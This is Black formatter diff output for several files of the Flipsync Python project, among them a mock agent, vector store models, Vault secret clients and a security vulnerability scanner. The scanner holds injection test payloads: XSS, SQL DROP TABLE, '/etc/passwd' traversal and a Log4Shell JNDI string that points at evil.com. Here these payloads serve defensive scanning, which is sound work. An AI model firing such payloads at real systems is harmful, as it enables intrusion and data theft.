+    def __init__(
+        self, agent_type: str = "mock", config: Optional[Dict[str, Any]] = None
+    ):
         """Initialize the mock agent service."""
         super().__init__(agent_type, config)
         self.response_templates = {
             "greeting": "Hello! I'm a {agent_type} agent. How can I help you today?",
             "listing": "I can help you with listing products. What would you like to list?",
             "pricing": "I can help you with pricing analysis. What product are you pricing?",
             "inventory": "I can help you manage your inventory. What do you need help with?",
-            "default": "I understand you're asking about {intent}. Let me help you with that."
+            "default": "I understand you're asking about {intent}. Let me help you with that.",
         }
-    
+
     async def _initialize_agent(self) -> None:
         """Initialize the mock agent."""
         # Mock agents don't need special initialization
         pass
-    
+
     async def process_message(
         self,
         message: ChatMessage,
         intent: MessageIntent,
         conversation_history: Optional[List[ChatMessage]] = None,
-        context: Optional[Dict[str, Any]] = None
+        context: Optional[Dict[str, Any]] = None,
     ) -> AgentResponse:
         """
         Process a message and return a mock response.
-        
+
         Args:
             message: The user message
             intent: The message intent
             conversation_history: Optional conversation history
             context: Optional context
-            
+
         Returns:
             Mock agent response
         """
         self.update_activity()
-        
+
         # Get appropriate response template
         template = self.response_templates.get(
-            intent.intent_type,
-            self.response_templates["default"]
+            intent.intent_type, self.response_templates["default"]
         )
-        
+
         # Format the response
         response_text = template.format(
-            agent_type=self.agent_type,
-            intent=intent.intent_type
+            agent_type=self.agent_type, intent=intent.intent_type
         )
-        
+
         return AgentResponse(
             text=response_text,
             agent_type=self.agent_type,
             confidence=0.8,
             metadata={
                 "mock_response": True,
                 "intent_type": intent.intent_type,
-                "message_id": message.message_id
-            }
+                "message_id": message.message_id,
+            },
         )
-    
+
     async def get_status(self) -> Dict[str, Any]:
         """
         Get the status of the mock agent.
-        
+
         Returns:
             Status dictionary
         """
         return {
             "agent_type": self.agent_type,
             "status": self.status,
             "initialized": self.initialized,
             "last_activity": self.last_activity.isoformat(),
             "capabilities": self.get_capabilities(),
-            "mock_agent": True
+            "mock_agent": True,
         }
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/services/agent_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/vector_store/__init__.py	2025-06-14 20:35:30.807778+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/vector_store/__init__.py	2025-06-19 04:03:57.813850+00:00
@@ -12,11 +12,11 @@
     VectorStoreConfig,
 )
 
 __all__ = [
     "CollectionInfo",
-    "MetricCategory", 
+    "MetricCategory",
     "MetricType",
     "MetricUpdate",
     "ProductMetadata",
     "SearchQuery",
     "SearchResult",
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/vector_store/__init__.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/vector_store/protocol.py	2025-06-14 20:35:30.807778+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/vector_store/protocol.py	2025-06-19 04:03:57.953501+00:00
@@ -6,118 +6,118 @@
 from .models import CollectionInfo, ProductMetadata, SearchResult, VectorStoreConfig
 
 
 class VectorStoreProtocol(ABC):
     """Protocol for vector store implementations."""
-    
+
     def __init__(self, config: VectorStoreConfig):
         """Initialize the vector store with configuration."""
         self.config = config
-    
+
     @abstractmethod
     async def initialize(self) -> bool:
         """Initialize the vector store connection.
-        
+
         Returns:
             True if initialization was successful
         """
         pass
-    
+
     @abstractmethod
     async def create_collection(self, collection_name: str, dimension: int) -> bool:
         """Create a new collection.
-        
+
         Args:
             collection_name: Name of the collection
             dimension: Vector dimension
-            
+
         Returns:
             True if creation was successful
         """
         pass
-    
+
     @abstractmethod
     async def delete_collection(self, collection_name: str) -> bool:
         """Delete a collection.
-        
+
         Args:
             collection_name: Name of the collection
-            
+
         Returns:
             True if deletion was successful
         """
         pass
-    
+
     @abstractmethod
     async def upsert_products(
         self,
         products: Sequence[ProductMetadata],
         vectors: Sequence[List[float]],
         batch_size: int = 100,
     ) -> bool:
         """Upsert products with their vectors.
-        
+
         Args:
             products: Product metadata
             vectors: Product vectors
             batch_size: Batch size for processing
-            
+
         Returns:
             True if upsert was successful
         """
         pass
-    
+
     @abstractmethod
     async def search_vectors(
         self,
         query_vector: List[float],
         limit: int = 10,
         filter_conditions: Optional[Dict[str, Any]] = None,
         score_threshold: float = 0.0,
     ) -> List[SearchResult]:
         """Search for similar vectors.
-        
+
         Args:
             query_vector: Query vector
             limit: Maximum number of results
             filter_conditions: Optional filters
             score_threshold: Minimum similarity score
-            
+
         Returns:
             List of search results
         """
         pass
-    
+
     @abstractmethod
     async def delete_vectors(self, ids: List[str]) -> bool:
         """Delete vectors by ID.
-        
+
         Args:
             ids: List of vector IDs to delete
-            
+
         Returns:
             True if deletion was successful
         """
         pass
-    
+
     @abstractmethod
     async def get_collection_info(self) -> CollectionInfo:
         """Get collection information.
-        
+
         Returns:
             Collection information
         """
         pass
-    
+
     @abstractmethod
     async def get_collection_stats(self) -> Dict[str, Any]:
         """Get collection statistics.
-        
+
         Returns:
             Collection statistics
         """
         pass
-    
+
     @abstractmethod
     async def close(self) -> None:
         """Close the vector store connection."""
         pass
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/vector_store/protocol.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/vector_store/models.py	2025-06-14 20:35:30.807778+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/vector_store/models.py	2025-06-19 04:03:58.041584+00:00
@@ -6,32 +6,36 @@
 from typing import Any, Dict, List, Optional
 
 
 class VectorDistanceMetric(Enum):
     """Distance metrics for vector similarity."""
+
     COSINE = "cosine"
     EUCLIDEAN = "euclidean"
     DOT_PRODUCT = "dot"
 
 
 class MetricType(Enum):
     """Types of metrics."""
+
     COUNTER = "counter"
     GAUGE = "gauge"
     HISTOGRAM = "histogram"
 
 
 class MetricCategory(Enum):
     """Categories of metrics."""
+
     SYSTEM = "system"
     BUSINESS = "business"
     PERFORMANCE = "performance"
 
 
 @dataclass
 class VectorStoreConfig:
     """Configuration for vector store."""
+
     store_id: str
     dimension: int
     distance_metric: VectorDistanceMetric = VectorDistanceMetric.COSINE
     host: str = "localhost"
     port: int = 6333
@@ -47,10 +51,11 @@
 
 
 @dataclass
 class MetricUpdate:
     """Metric update data."""
+
     name: str
     value: float
     metric_type: MetricType
     category: MetricCategory
     source: str
@@ -59,27 +64,30 @@
 
 
 @dataclass
 class SearchQuery:
     """Search query for vector store."""
+
     vector: List[float]
     limit: Optional[int] = 10
     filters: Optional[Dict[str, Any]] = None
     score_threshold: float = 0.0
 
 
 @dataclass
 class SearchResult:
     """Search result from vector store."""
+
     id: str
     score: float
     payload: Dict[str, Any]
 
 
 @dataclass
 class ProductMetadata:
     """Product metadata for vector store."""
+
     product_id: str
     title: str
     description: str
     price: float
     category: str
@@ -110,10 +118,11 @@
 
 
 @dataclass
 class CollectionInfo:
     """Information about a vector collection."""
+
     name: str
     vectors_count: int
     indexed_vectors_count: int
     points_count: int
     segments_count: int
--- /home/brend/Flipsync_Final/fs_agt_clean/core/test_integration.py	2025-06-14 20:35:30.803769+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/test_integration.py	2025-06-19 04:03:58.037364+00:00
@@ -27,11 +27,12 @@
         self.config_dir = Path(self.temp_dir.name)
 
         # Create a config file
         self.config_file = self.config_dir / "config.yaml"
         with open(self.config_file, "w") as f:
-            f.write("""
+            f.write(
+                """
 database:
   url: "sqlite:///:memory:"
   echo: false
   pool_size: 5
   max_overflow: 10
@@ -47,19 +48,18 @@
   key_size: 32
 
 feature_flags:
   storage_path: "${CONFIG_DIR}/feature_flags.json"
   read_interval: 5.0
-""")
+"""
+            )
 
         # Set environment variables
         os.environ["CONFIG_DIR"] = str(self.config_dir)
 
         # Create config manager
-        self.config_manager = ConfigManager(
-            config_dir=self.config_dir
-        )
+        self.config_manager = ConfigManager(config_dir=self.config_dir)
 
         # Load the config file
         self.config_manager.load(self.config_file)
 
     def tearDown(self):
@@ -72,32 +72,21 @@
             del os.environ["CONFIG_DIR"]
 
     def test_config_manager(self):
         """Test ConfigManager integration."""
         # Test getting configuration values
-        self.assertEqual(
-            self.config_manager.get("database.url"),
-            "sqlite:///:memory:"
-        )
-        self.assertEqual(
-            self.config_manager.get("encryption.key"),
-            "test_key"
-        )
-        self.assertEqual(
-            self.config_manager.get("feature_flags.read_interval"),
-            5.0
-        )
+        self.assertEqual(self.config_manager.get("database.url"), "sqlite:///:memory:")
+        self.assertEqual(self.config_manager.get("encryption.key"), "test_key")
+        self.assertEqual(self.config_manager.get("feature_flags.read_interval"), 5.0)
 
     def test_encryption_handler(self):
         """Test EncryptionHandler integration."""
         # Create encryption handler
-        encryption_handler = EncryptionHandler(
-            config_manager=self.config_manager
-        )
+        encryption_handler = EncryptionHandler(config_manager=self.config_manager)
 
         # Initialize with a test key
-        test_key = b'test_key_for_encryption_handler_test'
+        test_key = b"test_key_for_encryption_handler_test"
         encryption_handler.initialize(master_key=test_key)
 
         # Test encryption and decryption
         plaintext = "test_plaintext"
         encrypted_data = encryption_handler.encrypt(plaintext)
@@ -106,55 +95,42 @@
 
         # Test password hashing and verification
         password = "test_password"
         hashed = encryption_handler.hash_password(password)
         self.assertTrue(encryption_handler.verify_password(password, hashed))
-        self.assertFalse(
-            encryption_handler.verify_password("wrong_password", hashed)
-        )
+        self.assertFalse(encryption_handler.verify_password("wrong_password", hashed))
 
     def test_feature_flags(self):
         """Test FeatureFlagManager integration."""
         # Create feature flag manager
-        feature_flag_manager = FeatureFlagManager(
-            config_manager=self.config_manager
-        )
+        feature_flag_manager = FeatureFlagManager(config_manager=self.config_manager)
 
         # Test setting and getting feature flags
         feature_flag_manager.set_enabled("test_flag", True)
         self.assertTrue(feature_flag_manager.is_enabled("test_flag"))
         self.assertFalse(feature_flag_manager.is_enabled("nonexistent_flag"))
 
         # Test percentage-based feature flags
         feature_flag_manager.set_percentage_flag("percentage_flag", 50.0)
         self.assertTrue(
-            feature_flag_manager.is_enabled_for_percentage(
-                "percentage_flag", 25.0
-            )
+            feature_flag_manager.is_enabled_for_percentage("percentage_flag", 25.0)
         )
         self.assertFalse(
-            feature_flag_manager.is_enabled_for_percentage(
-                "percentage_flag", 75.0
-            )
+            feature_flag_manager.is_enabled_for_percentage("percentage_flag", 75.0)
         )
 
         # Test user-specific feature flags
         feature_flag_manager.set_user_flag("user_flag", ["user1", "user2"])
-        self.assertTrue(
-            feature_flag_manager.is_enabled_for_user("user_flag", "user1")
-        )
-        self.assertFalse(
-            feature_flag_manager.is_enabled_for_user("user_flag", "user3")
-        )
+        self.assertTrue(feature_flag_manager.is_enabled_for_user("user_flag", "user1"))
+        self.assertFalse(feature_flag_manager.is_enabled_for_user("user_flag", "user3"))
 
     def test_env_handler(self):
         """Test environment variable handling integration."""
         # Test interpolation
         os.environ["TEST_VAR"] = "test_value"
         self.assertEqual(
-            interpolate_env_vars("Value: ${TEST_VAR}"),
-            "Value: test_value"
+            interpolate_env_vars("Value: ${TEST_VAR}"), "Value: test_value"
         )
 
         # Test updating configuration from environment variables
         os.environ["APP_DATABASE__URL"] = "sqlite:///test.db"
         config = {}
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/test_integration.py
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/vector_store/models.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/vector_store/providers/test_qdrant.py	2025-06-14 20:35:30.807778+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/vector_store/providers/test_qdrant.py	2025-06-19 04:03:58.049101+00:00
@@ -11,10 +11,11 @@
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from qdrant import *
+
 
 class TestQdrant:
     """Test class for qdrant."""
 
     def test_import(self):
@@ -30,7 +31,8 @@
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/vector_store/providers/test_qdrant.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/vault/secret_manager.py	2025-06-14 20:35:30.803769+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/vault/secret_manager.py	2025-06-19 04:03:58.062791+00:00
@@ -10,10 +10,11 @@
 from typing import Any, Dict, Optional
 
 # Optional HashiCorp Vault client
 try:
     import hvac
+
     HVAC_AVAILABLE = True
 except ImportError:
     HVAC_AVAILABLE = False
     hvac = None
 
@@ -34,11 +35,13 @@
         Args:
             vault_url: Vault server URL
             vault_token: Vault authentication token
             mount_point: Vault mount point
         """
-        self.vault_url = vault_url or os.environ.get("VAULT_ADDR", "http://localhost:8200")
+        self.vault_url = vault_url or os.environ.get(
+            "VAULT_ADDR", "http://localhost:8200"
+        )
         self.vault_token = vault_token or os.environ.get("VAULT_TOKEN")
         self.mount_point = mount_point
 
         # Initialize Vault client
         if HVAC_AVAILABLE:
@@ -78,11 +81,13 @@
             # Check if client is available and authenticated
             if not self.client or not self.client.is_authenticated():
                 logger.error("Vault client is not available or not authenticated")
                 # Fall back to dev secrets if available
                 if self.is_dev and secret_name in self.dev_secrets:
-                    logger.warning(f"Using development fallback for secret {secret_name}")
+                    logger.warning(
+                        f"Using development fallback for secret {secret_name}"
+                    )
                     return self.dev_secrets[secret_name]
                 return None
 
             # Get secret from Vault
             if version:
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/vault/secret_manager.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/vault/vault_client.py	2025-06-14 20:35:30.807778+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/vault/vault_client.py	2025-06-19 04:03:58.292637+00:00
@@ -10,10 +10,11 @@
 from typing import Any, Dict, Optional
 
 # Optional HashiCorp Vault client
 try:
     import hvac
+
     HVAC_AVAILABLE = True
 except ImportError:
     HVAC_AVAILABLE = False
     hvac = None
 
@@ -21,124 +22,126 @@
 
 
 @dataclass
 class VaultConfig:
     """Configuration for Vault client."""
+
     url: str = "http://localhost:8200"
     token: Optional[str] = None
     mount_point: str = "secret"
     development_mode: bool = True
     timeout: int = 30
     verify_ssl: bool = True
-    
+
     @classmethod
     def from_env(cls) -> "VaultConfig":
         """Create VaultConfig from environment variables."""
         return cls(
             url=os.environ.get("VAULT_ADDR", "http://localhost:8200"),
             token=os.environ.get("VAULT_TOKEN"),
             mount_point=os.environ.get("VAULT_MOUNT_POINT", "secret"),
-            development_mode=os.environ.get("ENVIRONMENT", "development") == "development",
+            development_mode=os.environ.get("ENVIRONMENT", "development")
+            == "development",
             timeout=int(os.environ.get("VAULT_TIMEOUT", "30")),
             verify_ssl=os.environ.get("VAULT_VERIFY_SSL", "true").lower() == "true",
         )
 
 
 class VaultClient:
     """Client for HashiCorp Vault."""
-    
+
     def __init__(self, config: VaultConfig):
         """Initialize Vault client.
-        
+
         Args:
             config: Vault configuration
         """
         self.config = config
         self.client = None
         self._initialized = False
-        
+
         # Development fallback secrets
         self.dev_secrets = {
             "jwt_secret": "dev_jwt_secret_key_do_not_use_in_production",
             "encryption_key": "dev_encryption_key_do_not_use_in_production",
         }
-    
+
     async def initialize(self) -> bool:
         """Initialize the Vault client.
-        
+
         Returns:
             True if initialization was successful
         """
         if self._initialized:
             return True
-            
+
         if not HVAC_AVAILABLE:
             logger.warning("HVAC not available - Vault functionality will be limited")
             if self.config.development_mode:
                 logger.info("Running in development mode - using fallback secrets")
                 self._initialized = True
                 return True
             return False
-        
+
         try:
             self.client = hvac.Client(
                 url=self.config.url,
                 token=self.config.token,
                 timeout=self.config.timeout,
                 verify=self.config.verify_ssl,
             )
-            
+
             # Test authentication if token is provided
             if self.config.token and not self.client.is_authenticated():
                 logger.error("Vault authentication failed")
                 if self.config.development_mode:
                     logger.warning("Falling back to development mode")
                     self._initialized = True
                     return True
                 return False
-            
+
             self._initialized = True
             logger.info("Vault client initialized successfully")
             return True
-            
+
         except Exception as e:
             logger.error(f"Error initializing Vault client: {str(e)}")
             if self.config.development_mode:
                 logger.warning("Falling back to development mode")
                 self._initialized = True
                 return True
             return False
-    
+
     async def get_secret(self, secret_name: str, version: Optional[int] = None) -> Any:
         """Get a secret from Vault.
-        
+
         Args:
             secret_name: Name of the secret
             version: Version of the secret
-            
+
         Returns:
             Secret value
         """
         if not self._initialized:
             await self.initialize()
-        
+
         # In development mode or if client is not available, use fallback secrets
         if self.config.development_mode or not self.client:
             if secret_name in self.dev_secrets:
                 logger.warning(
                     f"Using development fallback for secret {secret_name}. "
                     "This should not be used in production!"
                 )
                 return self.dev_secrets[secret_name]
             return None
-        
+
         try:
             # Check if client is authenticated
             if not self.client.is_authenticated():
                 logger.error("Vault client is not authenticated")
                 return None
-            
+
             # Get secret from Vault
             if version:
                 secret = self.client.secrets.kv.v2.read_secret_version(
                     path=secret_name,
                     version=version,
@@ -147,77 +150,77 @@
             else:
                 secret = self.client.secrets.kv.v2.read_secret_version(
                     path=secret_name,
                     mount_point=self.config.mount_point,
                 )
-            
+
             # Extract data
             if secret and "data" in secret and "data" in secret["data"]:
                 return secret["data"]["data"]
-            
+
             logger.warning(f"Secret {secret_name} not found")
             return None
-            
+
         except Exception as e:
             logger.error(f"Error getting secret {secret_name}: {str(e)}")
             return None
-    
+
     async def set_secret(self, secret_name: str, secret_value: Dict[str, Any]) -> bool:
         """Set a secret in Vault.
-        
+
         Args:
             secret_name: Name of the secret
             secret_value: Value of the secret
-            
+
         Returns:
             True if successful
         """
         if not self._initialized:
             await self.initialize()
-        
+
         # In development mode, just log the operation
         if self.config.development_mode or not self.client:
             logger.info(f"Development mode: would set secret {secret_name}")
             return True
-        
+
         try:
             # Check if client is authenticated
             if not self.client.is_authenticated():
                 logger.error("Vault client is not authenticated")
                 return False
-            
+
             # Set secret in Vault
             self.client.secrets.kv.v2.create_or_update_secret(
                 path=secret_name,
                 secret=secret_value,
                 mount_point=self.config.mount_point,
             )
-            
+
             logger.debug(f"Set secret {secret_name}")
             return True
-            
+
         except Exception as e:
             logger.error(f"Error setting secret {secret_name}: {str(e)}")
             return False
-    
+
     def is_authenticated(self) -> bool:
         """Check if the client is authenticated.
-        
+
         Returns:
             True if authenticated
         """
         if self.config.development_mode:
             return True
-        
+
         if not self.client:
             return False
-        
+
         try:
             return self.client.is_authenticated()
         except Exception:
             return False
-    
+
     async def close(self):
         """Close the Vault client."""
         if self.client:
             # HVAC client doesn't have an explicit close method
             self.client = None
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/vault/vault_client.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/security/vulnerability_scanner.py	2025-06-16 05:09:18.697792+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/security/vulnerability_scanner.py	2025-06-19 04:03:58.388100+00:00
@@ -21,11 +21,11 @@
 logger = logging.getLogger(__name__)
 
 
 class VulnerabilityReport(BaseModel):
     """Vulnerability scan report."""
-    
+
     scan_id: str
     timestamp: datetime
     target_url: str
     scan_duration: float
     total_checks: int
@@ -40,31 +40,33 @@
     overall_score: float  # 0-100, higher is better
 
 
 class SecurityScanner:
     """Comprehensive security vulnerability scanner."""
-    
+
     def __init__(self, base_url: str, api_key: Optional[str] = None):
-        self.base_url = base_url.rstrip('/')
+        self.base_url = base_url.rstrip("/")
         self.api_key = api_key
         self.session = None
         self.vulnerabilities = []
         self.recommendations = []
-    
+
     async def scan(self) -> VulnerabilityReport:
         """Run comprehensive security scan."""
         scan_id = f"scan_{int(time.time())}"
         start_time = time.time()
-        
+
         logger.info(f"Starting security scan {scan_id} for {self.base_url}")
-        
+
         # Initialize session
         self.session = aiohttp.ClientSession(
             timeout=aiohttp.ClientTimeout(total=30),
-            connector=aiohttp.TCPConnector(ssl=False)  # Allow self-signed certs for testing
+            connector=aiohttp.TCPConnector(
+                ssl=False
+            ),  # Allow self-signed certs for testing
         )
-        
+
         try:
             # Run all security checks
             await self._check_ssl_tls()
             await self._check_security_headers()
             await self._check_authentication()
@@ -72,25 +74,29 @@
             await self._check_rate_limiting()
             await self._check_input_validation()
             await self._check_information_disclosure()
             await self._check_common_vulnerabilities()
             await self._check_api_security()
-            
+
             # Calculate metrics
             scan_duration = time.time() - start_time
             total_checks = 9  # Number of check categories
-            
+
             # Categorize vulnerabilities by severity
-            critical = len([v for v in self.vulnerabilities if v.get('severity') == 'CRITICAL'])
-            high = len([v for v in self.vulnerabilities if v.get('severity') == 'HIGH'])
-            medium = len([v for v in self.vulnerabilities if v.get('severity') == 'MEDIUM'])
-            low = len([v for v in self.vulnerabilities if v.get('severity') == 'LOW'])
-            info = len([v for v in self.vulnerabilities if v.get('severity') == 'INFO'])
-            
+            critical = len(
+                [v for v in self.vulnerabilities if v.get("severity") == "CRITICAL"]
+            )
+            high = len([v for v in self.vulnerabilities if v.get("severity") == "HIGH"])
+            medium = len(
+                [v for v in self.vulnerabilities if v.get("severity") == "MEDIUM"]
+            )
+            low = len([v for v in self.vulnerabilities if v.get("severity") == "LOW"])
+            info = len([v for v in self.vulnerabilities if v.get("severity") == "INFO"])
+
             # Calculate overall security score
             overall_score = self._calculate_security_score(critical, high, medium, low)
-            
+
             report = VulnerabilityReport(
                 scan_id=scan_id,
                 timestamp=datetime.now(),
                 target_url=self.base_url,
                 scan_duration=scan_duration,
@@ -101,307 +107,323 @@
                 medium_issues=medium,
                 low_issues=low,
                 info_issues=info,
                 vulnerabilities=self.vulnerabilities,
                 recommendations=self.recommendations,
-                overall_score=overall_score
-            )
-            
-            logger.info(f"Security scan {scan_id} completed. Score: {overall_score}/100")
+                overall_score=overall_score,
+            )
+
+            logger.info(
+                f"Security scan {scan_id} completed. Score: {overall_score}/100"
+            )
             return report
-            
+
         finally:
             if self.session:
                 await self.session.close()
-    
+
     async def _check_ssl_tls(self):
         """Check SSL/TLS configuration."""
         logger.info("Checking SSL/TLS configuration...")
-        
+
         try:
             # Check if HTTPS is enforced
-            http_url = self.base_url.replace('https://', 'http://')
+            http_url = self.base_url.replace("https://", "http://")
             async with self.session.get(http_url, allow_redirects=False) as response:
                 if response.status != 301 and response.status != 302:
                     self._add_vulnerability(
                         "HTTPS Not Enforced",
                         "HIGH",
                         "HTTP requests are not redirected to HTTPS",
-                        "Configure HTTPS redirect middleware"
+                        "Configure HTTPS redirect middleware",
                     )
         except Exception as e:
             logger.debug(f"HTTP check failed: {e}")
-        
+
         # Check SSL certificate
         try:
             parsed_url = urlparse(self.base_url)
-            if parsed_url.scheme == 'https':
+            if parsed_url.scheme == "https":
                 context = ssl.create_default_context()
                 with ssl.create_connection((parsed_url.hostname, 443)) as sock:
-                    with context.wrap_socket(sock, server_hostname=parsed_url.hostname) as ssock:
+                    with context.wrap_socket(
+                        sock, server_hostname=parsed_url.hostname
+                    ) as ssock:
                         cert = ssock.getpeercert()
-                        
+
                         # Check certificate expiry
-                        not_after = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
+                        not_after = datetime.strptime(
+                            cert["notAfter"], "%b %d %H:%M:%S %Y %Z"
+                        )
                         days_until_expiry = (not_after - datetime.now()).days
-                        
+
                         if days_until_expiry < 30:
                             self._add_vulnerability(
                                 "SSL Certificate Expiring Soon",
                                 "MEDIUM",
                                 f"Certificate expires in {days_until_expiry} days",
-                                "Renew SSL certificate"
+                                "Renew SSL certificate",
                             )
         except Exception as e:
             self._add_vulnerability(
                 "SSL Certificate Issue",
                 "HIGH",
                 f"SSL certificate validation failed: {str(e)}",
-                "Fix SSL certificate configuration"
-            )
-    
+                "Fix SSL certificate configuration",
+            )
+
     async def _check_security_headers(self):
         """Check security headers."""
         logger.info("Checking security headers...")
-        
+
         try:
             async with self.session.get(f"{self.base_url}/health") as response:
                 headers = response.headers
-                
+
                 # Required security headers
                 required_headers = {
-                    'Strict-Transport-Security': 'HSTS not configured',
-                    'X-Content-Type-Options': 'Content type sniffing protection missing',
-                    'X-Frame-Options': 'Clickjacking protection missing',
-                    'X-XSS-Protection': 'XSS protection missing',
-                    'Content-Security-Policy': 'Content Security Policy missing',
-                    'Referrer-Policy': 'Referrer policy missing'
+                    "Strict-Transport-Security": "HSTS not configured",
+                    "X-Content-Type-Options": "Content type sniffing protection missing",
+                    "X-Frame-Options": "Clickjacking protection missing",
+                    "X-XSS-Protection": "XSS protection missing",
+                    "Content-Security-Policy": "Content Security Policy missing",
+                    "Referrer-Policy": "Referrer policy missing",
                 }
-                
+
                 for header, description in required_headers.items():
                     if header not in headers:
                         self._add_vulnerability(
                             f"Missing Security Header: {header}",
                             "MEDIUM",
                             description,
-                            f"Add {header} security header"
-                        )
-                
+                            f"Add {header} security header",
+                        )
+
                 # Check for information disclosure headers
-                disclosure_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version']
+                disclosure_headers = ["Server", "X-Powered-By", "X-AspNet-Version"]
                 for header in disclosure_headers:
                     if header in headers:
                         self._add_vulnerability(
                             f"Information Disclosure: {header}",
                             "LOW",
                             f"Server information disclosed in {header} header",
-                            f"Remove or obfuscate {header} header"
-                        )
-        
+                            f"Remove or obfuscate {header} header",
+                        )
+
         except Exception as e:
             logger.error(f"Security headers check failed: {e}")
-    
+
     async def _check_authentication(self):
         """Check authentication security."""
         logger.info("Checking authentication security...")
-        
+
         # Test authentication endpoints
-        auth_endpoints = ['/api/v1/auth/login', '/auth/login', '/login']
-        
+        auth_endpoints = ["/api/v1/auth/login", "/auth/login", "/login"]
+
         for endpoint in auth_endpoints:
             try:
                 url = f"{self.base_url}{endpoint}"
-                
+
                 # Test for timing attacks
                 start_time = time.time()
-                async with self.session.post(url, json={
-                    "email": "nonexistent@example.com",
-                    "password": "wrongpassword"
-                }) as response:
+                async with self.session.post(
+                    url,
+                    json={
+                        "email": "nonexistent@example.com",
+                        "password": "wrongpassword",
+                    },
+                ) as response:
                     response_time = time.time() - start_time
-                
+
                 # Check for information disclosure in error messages
                 if response.status == 200:
                     text = await response.text()
-                    if "user not found" in text.lower() or "invalid user" in text.lower():
+                    if (
+                        "user not found" in text.lower()
+                        or "invalid user" in text.lower()
+                    ):
                         self._add_vulnerability(
                             "Username Enumeration",
                             "MEDIUM",
                             "Authentication endpoint reveals whether user exists",
-                            "Use generic error messages for authentication failures"
-                        )
-                
+                            "Use generic error messages for authentication failures",
+                        )
+
                 # Test rate limiting on auth endpoints
                 await self._test_auth_rate_limiting(url)
-                
+
             except Exception as e:
                 logger.debug(f"Auth endpoint {endpoint} check failed: {e}")
-    
+
     async def _test_auth_rate_limiting(self, url: str):
         """Test rate limiting on authentication endpoints."""
         try:
             # Send multiple rapid requests
             tasks = []
             for i in range(10):
-                task = self.session.post(url, json={
-                    "email": f"test{i}@example.com",
-                    "password": "wrongpassword"
-                })
+                task = self.session.post(
+                    url,
+                    json={"email": f"test{i}@example.com", "password": "wrongpassword"},
+                )
                 tasks.append(task)
-            
+
             responses = await asyncio.gather(*tasks, return_exceptions=True)
-            
+
             # Check if any requests were rate limited
             rate_limited = any(
-                hasattr(r, 'status') and r.status == 429 
-                for r in responses if not isinstance(r, Exception)
-            )
-            
+                hasattr(r, "status") and r.status == 429
+                for r in responses
+                if not isinstance(r, Exception)
+            )
+
             if not rate_limited:
                 self._add_vulnerability(
                     "Insufficient Rate Limiting",
                     "HIGH",
                     "Authentication endpoint lacks proper rate limiting",
-                    "Implement rate limiting on authentication endpoints"
+                    "Implement rate limiting on authentication endpoints",
                 )
-        
+
         except Exception as e:
             logger.debug(f"Rate limiting test failed: {e}")
-    
+
     async def _check_cors_configuration(self):
         """Check CORS configuration."""
         logger.info("Checking CORS configuration...")
-        
+
         try:
             # Test CORS with malicious origin
-            headers = {'Origin': 'https://evil.com'}
-            async with self.session.options(f"{self.base_url}/api/v1/health", headers=headers) as response:
-                cors_origin = response.headers.get('Access-Control-Allow-Origin')
-                
-                if cors_origin == '*':
+            headers = {"Origin": "https://evil.com"}
+            async with self.session.options(
+                f"{self.base_url}/api/v1/health", headers=headers
+            ) as response:
+                cors_origin = response.headers.get("Access-Control-Allow-Origin")
+
+                if cors_origin == "*":
                     self._add_vulnerability(
                         "Overly Permissive CORS",
                         "HIGH",
                         "CORS allows all origins (*)",
-                        "Configure specific allowed origins for CORS"
+                        "Configure specific allowed origins for CORS",
                     )
-                elif cors_origin == 'https://evil.com':
+                elif cors_origin == "https://evil.com":
                     self._add_vulnerability(
                         "CORS Origin Reflection",
                         "HIGH",
                         "CORS reflects arbitrary origins",
-                        "Validate CORS origins against whitelist"
+                        "Validate CORS origins against whitelist",
                     )
-        
+
         except Exception as e:
             logger.debug(f"CORS check failed: {e}")
-    
+
     async def _check_rate_limiting(self):
         """Check rate limiting implementation."""
         logger.info("Checking rate limiting...")
-        
+
         try:
             # Test general rate limiting
             url = f"{self.base_url}/api/v1/health"
-            
+
             # Send rapid requests
             tasks = [self.session.get(url) for _ in range(20)]
             responses = await asyncio.gather(*tasks, return_exceptions=True)
-            
+
             # Check for rate limiting
             rate_limited = any(
-                hasattr(r, 'status') and r.status == 429 
-                for r in responses if not isinstance(r, Exception)
-            )
-            
+                hasattr(r, "status") and r.status == 429
+                for r in responses
+                if not isinstance(r, Exception)
+            )
+
             if not rate_limited:
                 self._add_vulnerability(
                     "No Rate Limiting",
                     "MEDIUM",
                     "API endpoints lack rate limiting protection",
-                    "Implement rate limiting middleware"
+                    "Implement rate limiting middleware",
                 )
-        
+
         except Exception as e:
             logger.debug(f"Rate limiting check failed: {e}")
-    
+
     async def _check_input_validation(self):
         """Check input validation."""
         logger.info("Checking input validation...")
-        
+
         # Test common injection payloads
         payloads = [
             "<script>alert('xss')</script>",
             "'; DROP TABLE users; --",
             "../../../etc/passwd",
             "${jndi:ldap://evil.com/a}",
             "{{7*7}}",
             "<%=7*7%>",
         ]
-        
-        test_endpoints = ['/api/v1/inventory', '/api/v1/users']
-        
+
